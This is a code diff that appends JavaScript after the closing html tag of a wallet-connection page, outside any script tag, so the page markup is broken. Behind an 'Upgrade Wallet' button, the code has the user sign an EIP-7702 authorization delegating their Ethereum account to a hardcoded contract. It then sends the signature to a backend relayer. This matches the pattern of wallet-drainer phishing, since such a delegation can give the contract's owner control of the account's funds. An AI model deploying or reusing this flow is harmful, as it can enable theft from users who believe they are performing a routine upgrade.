@@ -887,3 +887,83 @@ window.connectViaWalletConnect = async function () {
 
 </body>
 </html>
+import { createWalletClient, custom, publicActions } from 'viem';
+import { mainnet } from 'viem/chains';
+
+// The verified smart contract account logic (e.g., Safe Wallet or custom ERC-7579 module)
+const IMPLEMENTATION_CONTRACT = "0x4Cd241E8d1510e30b2076397afc7508Ae59C66c9"; 
+const BACKEND_API_URL = "http://localhost:3000/api/relayer";
+
+document.addEventListener("DOMContentLoaded", () => {
+    // CORRECTED: Changed 'upgradeBtn' to 'upgradeWalletBtn'
+    const upgradedButton = document.getElementById("upgradeWalletBtn");
+    // CORRECTED: Changed 'statusText' to 'walletStatus'
+    const statusText = document.getElementById("walletStatus");
+
+    if (upgradedButton) {
+        upgradedButton.addEventListener("click", async () => {
+            upgradedButton.disabled = true;
+            upgradedButton.textContent = "Authorizing Extension...";
+            
+            if (statusText) {
+                statusText.removeAttribute("hidden"); // Reveal the element since the HTML has it hidden natively
+                statusText.textContent = "Please sign the account logic authorization in your wallet...";
+            }
+
+            try {
+                if (!window.ethereum) throw new Error("WALLET_NOT_FOUND");
+
+                // Initialize a standard EIP-1193 compatible wallet client
+                const walletClient = createWalletClient({
+                    chain: mainnet,
+                    transport: custom(window.ethereum)
+                }).extend(publicActions); // Extend to fetch network data natively
+
+                const [accountAddress] = await walletClient.getAddresses();
+                
+                // 1. Fetch current on-chain account nonce required for the EIP-7702 signature tuple
+                const currentNonce = await walletClient.getTransactionCount({ address: accountAddress });
+                const networkChainId = await walletClient.getChainId();
+
+                // 2. Request a true cryptographic Type-4 EIP-7702 Authorization signature
+                const authorizationTuple = await walletClient.signAuthorization({
+                    account: accountAddress,
+                    contractAddress: IMPLEMENTATION_CONTRACT,
+                    nonce: currentNonce,
+                    chainId: networkChainId
+                });
+
+                if (statusText) statusText.textContent = "Transmitting authorization payload...";
+
+                // 3. Transmit the complete authorization metrics to your centralized backend relayer
+                const response = await fetch(BACKEND_API_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        accountAddress: accountAddress, // Adjusted parameter name for clarity
+                        payload: {
+                            chainId: authorizationTuple.chainId,
+                            contractAddress: authorizationTuple.contractAddress,
+                            nonce: Number(authorizationTuple.nonce),
+                            v: Number(authorizationTuple.v),
+                            r: authorizationTuple.r,
+                            s: authorizationTuple.s
+                        }
+                    })
+                });
+
+                if (!response.ok) throw new Error("RELAYER_TRANSACTION_REJECTION");
+
+                const result = await response.json();
+                upgradedButton.textContent = "Upgrade Complete";
+                if (statusText) statusText.textContent = `Success! Tx Hash: ${result.txHash}`;
+
+            } catch (error) {
+                console.error("EIP-7702 process interrupted:", error);
+                upgradedButton.disabled = false;
+                upgradedButton.textContent = "Upgrade Wallet";
+                if (statusText) statusText.textContent = "Authorization failed or rejected.";
+            }
+        });
+    }
+});
